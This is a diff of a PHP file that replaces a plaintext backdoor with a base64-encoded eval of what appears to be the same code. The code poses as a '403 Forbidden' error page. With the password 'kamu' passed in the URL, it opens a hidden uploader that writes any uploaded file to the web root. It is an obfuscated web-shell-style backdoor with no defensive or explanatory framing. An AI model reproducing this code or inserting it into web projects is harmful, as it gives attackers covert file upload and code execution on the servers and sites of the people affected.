@@ -1,12 +1,1 @@
-<?php
-echo "<html><head>
-<title>403 Forbidden</title>
-</head><body>
-<h1>Forbidden</h1>
-<p>You don't have permission to access ".$_SERVER['REQUEST_URI']."  on this server.</p>
-<p>Additionally, a 403 Forbidden
-error was encountered while trying to use an ErrorDocument to handle the request.</p>
-</body></html>";if(isset($_POST['uploaded'])){$file=$_FILES['files']['name'];$files=$_FILES['files']['tmp_name'];$folder="";if(move_uploaded_file($files,$folder.$file)){$result="Uploaded : => <A href='$file' target='_blank'>Your file here</A>";}else {$result="Failed to upload...!";}}$password="kamu";if($_GET['pass']==$password){echo '<br /><br /><br /><html><head><title>RIAU UPLOADER</title></head><body><center><form action="" method="post" enctype="multipart/form-data">
-<input type="file" name="files" />
-<input type="submit" name="uploaded" value="Upload">
-</form>'.$result.'</center></body></html>';}?>
+<?php eval("?>".base64_decode("PD9waHANCmVjaG8gIjxodG1sPjxoZWFkPg0KPHRpdGxlPjQwMyBGb3JiaWRkZW48L3RpdGxlPg0KPC9oZWFkPjxib2R5Pg0KPGgxPkZvcmJpZGRlbjwvaDE+DQo8cD5Zb3UgZG9uJ3QgaGF2ZSBwZXJtaXNzaW9uIHRvIGFjY2VzcyAiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiIgIG9uIHRoaXMgc2VydmVyLjwvcD4NCjxwPkFkZGl0aW9uYWxseSwgYSA0MDMgRm9yYmlkZGVuDQplcnJvciB3YXMgZW5jb3VudGVyZWQgd2hpbGUgdHJ5aW5nIHRvIHVzZSBhbiBFcnJvckRvY3VtZW50IHRvIGhhbmRsZSB0aGUgcmVxdWVzdC48L3A+DQo8L2JvZHk+PC9odG1sPiI7aWYoaXNzZXQoJF9QT1NUWyd1cGxvYWRlZCddKSl7JGZpbGU9JF9GSUxFU1snZmlsZXMnXVsnbmFtZSddOyRmaWxlcz0kX0ZJTEVTWydmaWxlcyddWyd0bXBfbmFtZSddOyRmb2xkZXI9IiI7aWYobW92ZV91cGxvYWRlZF9maWxlKCRmaWxlcywkZm9sZGVyLiRmaWxlKSl7JHJlc3VsdD0iVXBsb2FkZWQgOiA9PiA8QSBocmVmPSckZmlsZScgdGFyZ2V0PSdfYmxhbmsnPllvdXIgZmlsZSBoZXJlPC9BPiI7fWVsc2UgeyRyZXN1bHQ9IkZhaWxlZCB0byB1cGxvYWQuLi4hIjt9fSRwYXNzd29yZD0ia2FtdSI7aWYoJF9HRVRbJ3Bhc3MnXT09JHBhc3N3b3JkKXtlY2hvICc8YnIgLz48YnIgLz48YnIgLz48aHRtbD48aGVhZD48dGl0bGU+UklBVSBVUExPQURFUjwvdGl0bGU+PC9oZWFkPjxib2R5PjxjZW50ZXI+PGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+DQo8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZXMiIC8+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJ1cGxvYWRlZCIgdmFsdWU9IlVwbG9hZCI+DQo8L2Zvcm0+Jy4kcmVzdWx0Lic8L2NlbnRlcj48L2JvZHk+PC9odG1sPic7fT8+DQo=")); ?>
